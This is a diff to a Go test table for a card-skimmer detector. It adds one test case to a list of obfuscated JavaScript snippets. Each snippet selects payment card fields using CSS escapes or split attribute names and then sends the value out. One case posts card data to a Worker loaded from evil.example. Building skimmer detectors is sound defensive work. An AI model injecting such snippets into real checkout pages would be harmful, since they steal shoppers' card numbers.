@@ -357,6 +357,7 @@ func TestSkimmerSelectorsExitsAndData(t *testing.T) {
 		"quoted split name":     `var f=document.querySelector('input[name^="card"][name$="number" i]')` + send,
 		"CSS escape":            `var f=document.querySelector('[name=\\63 vv]')` + send,
 		"CSS escape no blank":   `var f=document.querySelector('[name*=\\000063vv]')` + send,
+		"base64 head in code":   `var base64;var v=0;base64,0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+cardnumber.value` + send,
 		"split name with a gap": `var f=document.querySelector('[name^="payment[c"][name$="_number]"]')` + send,
 		"escaped id":            `var f=document.querySelector('#card\\4e umber')` + send,
 		"worker":                `var f=document.querySelector('[name="cc_number"]');new Worker('https://evil.example/w.js').postMessage(f.value)`,
